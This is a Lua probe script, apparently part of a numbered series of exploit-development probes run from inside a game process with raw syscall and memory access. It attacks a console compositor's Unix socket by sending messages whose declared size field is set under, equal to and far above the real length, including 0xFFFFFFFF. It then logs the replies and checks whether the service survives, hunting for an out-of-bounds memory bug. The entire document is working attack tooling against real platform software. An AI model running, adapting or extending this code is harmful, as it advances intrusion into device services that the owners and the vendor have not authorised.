-- CRASH_CLASS: MODERATE
-- PROBE 441a: does the compositor trust the size field over the bytes it received?
--
-- 373a recovered the request shape: `{u32 size; u32 command; ...}` in a message of at least
-- 0x30 bytes, and the reply `{u32 type=1; u32 flags; u32 u32 payload_len; u32 status; payload}`.
-- Command 0 answers 0x1340 bytes of payload, command 6 answers 16, commands 1-6 answer 16.
--
-- The one field we have never varied independently is `size`. A parser that trusts it either
-- reads past the bytes it got (a kernel-side short read) or copies by it. This sends the same
-- command with `size` a little under, exactly equal, and far over the real message length,
-- including 0xFFFFFFFF, and records the reply and whether the service is still listening.
--
-- SIGPIPE is ignored and blocked first: without that, the first write to a closed peer kills
-- the game process (361a learned this the hard way).

print("=== PROBE 441a: COMPOSITOR SIZE DIFFERENTIAL ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end

-- SIGPIPE ignored (12 is SIGSYS, 13 is SIGPIPE); handler value 1 = ignore
local sa = memory.alloc(0x20)
memory.write_qword(sa, uint64(1))
print(string.format("[A] sigaction(13)=%d sigprocmask(0x1000)=%d",
    call(416, 13, sa, 0, 0, 0, 0), call(340, 1, 0x1000, 0, 0, 0, 0)))

local msg = memory.alloc(0x1000)
local out = memory.alloc(0x2000)
local sa_un = memory.alloc(0x80)
local PATH = "/system_tmp/GnmCompositorRestricted"

local function fill_sockaddr()
    local i = 0
    while i < 0x80 do memory.write_byte(sa_un + i, 0); i = i + 1 end
    memory.write_byte(sa_un, 2 + #PATH)
    memory.write_byte(sa_un + 1, 1)
    local j = 1
    while j <= #PATH do memory.write_byte(sa_un + 1 + j, PATH:byte(j)); j = j + 1 end
end
fill_sockaddr()

local function connect()
    local fd = call(97, 1, 1, 0, 0, 0, 0)
    if fd < 0 then return -1 end
    if call(98, fd, sa_un, 0, 0, 0, 0) ~= 0 then
        call(6, fd, 0, 0, 0, 0, 0)
        return -1
    end
    return fd
end

local function send_case(cmd, decl, actual)
    local fd = connect()
    if fd < 0 then return "connect-failed" end
    local i = 0
    while i < 0x40 do memory.write_byte(msg + i, 0); i = i + 1 end
    memory.write_dword(msg + 0, decl)
    memory.write_dword(msg + 4, cmd)
    local sent = call(100, fd, msg, actual, 0, 0, 0)
    if sent < 0 then
        call(6, fd, 0, 0, 0, 0, 0)
        return string.format("send=%d", sent)
    end
    local n = call(29, fd, out, 0x1800, 0x80, 0, 0)
    call(6, fd, 0, 0, 0, 0, 0)
    if n < 0 then return string.format("sent=%d recv=%d", sent, n) end
    if n == 0 then return string.format("sent=%d closed", sent) end
    local t = to_num(memory.read_dword(out + 0))
    local f = to_num(memory.read_dword(out + 4))
    local l = to_num(memory.read_dword(out + 8))
    local st = to_num(memory.read_dword(out + 12))
    return string.format("sent=%d n=%d type=%d flags=0x%X len=%d st=0x%X", sent, n, t, f, l, st)
end

local cmds = {0, 1, 6, 7}
local variants = {
    {"decl=0x30", 0x30, 0x30},
    {"decl=0x20", 0x20, 0x30},
    {"decl=0x40", 0x40, 0x30},
    {"decl=0x1000", 0x1000, 0x30},
    {"decl=0xFFFFFFFF", 0xFFFFFFFF, 0x30},
    {"decl=0x40 act=0x20", 0x40, 0x20},
}

local c = 1
while c <= #cmds do
    local v = 1
    while v <= #variants do
        local name, decl, act = variants[v][1], variants[v][2], variants[v][3]
        local r = send_case(cmds[c], decl, act)
        print(string.format("[B] cmd=%d %s -> %s", cmds[c], name, r))
        v = v + 1
    end
    c = c + 1
end

-- is it still listening?
local fd = connect()
print(string.format("[C] still listening: %s", (fd >= 0) and "yes" or "no"))
if fd >= 0 then call(6, fd, 0, 0, 0, 0, 0) end

print("=== 441a DONE ===")
